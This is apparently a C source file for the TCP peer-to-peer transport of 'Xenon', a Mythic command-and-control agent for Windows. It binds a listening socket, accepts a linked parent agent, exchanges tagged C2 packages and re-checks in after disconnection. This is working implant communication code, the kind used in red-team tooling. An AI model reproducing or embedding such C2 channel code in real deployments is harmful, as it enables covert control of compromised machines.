#include "TransportTcp.h"

#include "Xenon.h"
#include "Config.h"
#include "Package.h"
#include "Checkin.h"

/* This file is the the Mythic TCP profile */
#ifdef TCP_TRANSPORT


BOOL gTcpIsInit = FALSE;

void TcpInit(void)
{
	if (gTcpIsInit)
		return;

	WSADATA wsaData;
	if (WSAStartup(MAKEWORD(2, 2), &wsaData))
	{
		WSACleanup();
		exit(1);
	}

	gTcpIsInit = TRUE;
}

/**
 * @brief Send data to TCP C2 Channel
 * 
 * @return BOOL  
 */
BOOL TcpSend(PPackage package)
{
	BOOL   Success = FALSE;

    /* Prepend P2P Linking ID to Package
     * This SmbId is used by the receiving agent (via LinkPush) to verify
     * that the message came from the correct linked agent */
    PPackage Send = PackageInit(NULL, FALSE);
    PackageAddInt32(Send, xenonConfig->TcpId);
    PackageAddBytes(Send, package->buffer, package->length, FALSE);

    _dbg("[TCP Comms] Sending msg with %d bytes : LinkId [%x]", Send->length, xenonConfig->TcpId);

	/* Not initialized Yet */
	if ( (!xenonConfig->TcpSocketServer) || (!xenonConfig->TcpSocketClient) )
	{
        /* Create Named Pipe and connect to it */
		if ( !TcpSocketCreate() )
        {
            _err("Failed to create TCP bind. ERROR : %d", GetLastError());
            // TODO: Close sockets 
            goto END;
        }
			
		/* Send the message to the named pipe */
		if ( !PackageSendTcp(xenonConfig->TcpSocketClient, Send->buffer, Send->length) )
        {
            _err("Failed to send msg to TCP. ERROR : %d ", GetLastError());
            if ((xenonConfig->TcpSocketClient != NULL) && (xenonConfig->TcpSocketClient != INVALID_SOCKET))
            {
                _dbg("[TCP Comms] close TcpSocketClient [%d]", xenonConfig->TcpSocketClient);
                closesocket(xenonConfig->TcpSocketClient);
                xenonConfig->TcpSocketClient = NULL;
            }

            if ((xenonConfig->TcpSocketServer != NULL) && (xenonConfig->TcpSocketServer != INVALID_SOCKET))
            {
                _dbg("[TCP Comms] close TcpSocketServer [%d]", xenonConfig->TcpSocketServer);
                closesocket(xenonConfig->TcpSocketServer);
                xenonConfig->TcpSocketServer = NULL;
            }
            goto END;
        }

        /* Skip to end */
        Success = TRUE;
        goto END;
	}

	/* Send if TCP is already initialized */
	if ( !PackageSendTcp(xenonConfig->TcpSocketClient, Send->buffer, Send->length) )
	{
        DWORD error = GetLastError();
        /* Means that the client disconnected/the pipe is closing. */
		if ( error == ERROR_NO_DATA )
		{
			if ( (xenonConfig->TcpSocketClient != NULL) && (xenonConfig->TcpSocketClient != INVALID_SOCKET) ) 
            {
				closesocket(xenonConfig->TcpSocketClient);
                xenonConfig->TcpSocketClient = NULL;
				goto END;
			}
		}
        if ( error == ERROR_INVALID_HANDLE )
        {
            _err("INVALID_HANDLE");
            goto END;
        }
	}

	Success = TRUE;

END:
    PackageDestroy(Send);
	return Success;
}




/**
 * @brief Read data from TCP C2 Channel
 *
 * @return BOOL  
 */
BOOL TcpRecieve(PBYTE* ppOutData, SIZE_T* pOutLen)
{
    DWORD BytesSize   = 0;
    DWORD BytesRead   = 0;
    DWORD PackageSize = 0;
    DWORD Total       = 0;
    PVOID Buffer      = NULL;

    if ( !xenonConfig->TcpSocketClient )    
    {
        /* Means that the client disconnected/the TCP is closing. */
        _dbg("TCP not initialized!");
        return FALSE;
    }

    if ( !PackageReadTcp(xenonConfig->TcpSocketClient, ppOutData, pOutLen) )
    {
        /* Parent Agent disconnected, recovering socket */
        int error = WSAGetLastError();
        if ( (error != WSAEWOULDBLOCK) && (error != 0))
        {
            _dbg("Parent Agent disconnected, recovering socket ...");\
            
            /* Tear down socket and create completely new one */
            closesocket(xenonConfig->TcpSocketClient);
            xenonConfig->TcpSocketClient = NULL;

            if ( TcpSocketCreate() )
            {
                _dbg("Waiting for new parent to connect...");
                
                if ( !CheckinSend() )
                {
                    _err("Failed to send checkin request");
                    return FALSE;
                }
            }

            _err("Failed to create new TCP socket");
            return FALSE;
        }
        
        _err("Failed to read from socket. ERROR : %d", WSAGetLastError());
        return FALSE;
    }

    _dbg("Read %d bytes from socket", *pOutLen);

    return TRUE;
}


/**
 * @brief Create a new TCP socket and connect to it.
 *
 * @note listen WILL BLOCK until a client connects to the TCP socket.
 * 
 * @return BOOL - Success
 */
BOOL TcpSocketCreate()
{

    struct sockaddr_in addr_server;
    
    // check if server if socket exists
    if (xenonConfig->TcpSocketServer == NULL)
    {
        TcpInit();
        _dbg("[TCP] TcpBind->TcpSocketServer not exists");
        xenonConfig->TcpSocketServer = WSASocketA(AF_INET, SOCK_STREAM, IPPROTO_TCP, 0, 0, 0);
        addr_server.sin_family = AF_INET;
        addr_server.sin_addr.s_addr = inet_addr(xenonConfig->TcpBindAddress);
        addr_server.sin_port = htons(xenonConfig->TcpPort);
        if (bind(xenonConfig->TcpSocketServer, (SOCKADDR *) &addr_server, sizeof(addr_server)) == SOCKET_ERROR) 
        {
            _err("[TCP] bind TCP failed : ERROR %d", GetLastError());
            closesocket(xenonConfig->TcpSocketServer);
            WSACleanup();
            return FALSE;
        }
        else
        {
            _dbg("[TCP] bind TCP OK");
        }
            
    }
    _dbg("[TCP] TcpBind->ServerSocket exists");
    if (xenonConfig->TcpSocketClient == NULL)
    {
        _dbg("[TCP] TcpBind->ClientSocket not exists");
        if(listen(xenonConfig->TcpSocketServer, 1) == SOCKET_ERROR)
        {
            _err("[TCP] listen TCP failed : ERROR %d", GetLastError());
            closesocket(xenonConfig->TcpSocketServer);
            return FALSE;
        }
        _dbg("[TCP] listen TCP OK");
        _dbg("[TCP] Accepting TCP connection ...");
        xenonConfig->TcpSocketClient = accept(xenonConfig->TcpSocketServer, NULL, NULL);
        if (xenonConfig->TcpSocketClient == INVALID_SOCKET)
        {
            _err("[TCP] accept TCP failed : ERROR %d", GetLastError());
            closesocket(xenonConfig->TcpSocketServer);
            return FALSE;
        }
        else
        {
            _dbg("[TCP] accept TCP OK");
            _dbg("[TCP] Setting up Non-blocking mode");
            u_long mode = 1;
            if (ioctlsocket(xenonConfig->TcpSocketClient, FIONBIO, &mode) == SOCKET_ERROR) {
                _dbg("ioctlsocket failed: %d\n", WSAGetLastError());
                return FALSE;
            }

        }
    }
    _dbg("[TCP] TcpBind->ClientSocket exists");


    return TRUE;
}

#endif // TCP_TRANSPORT
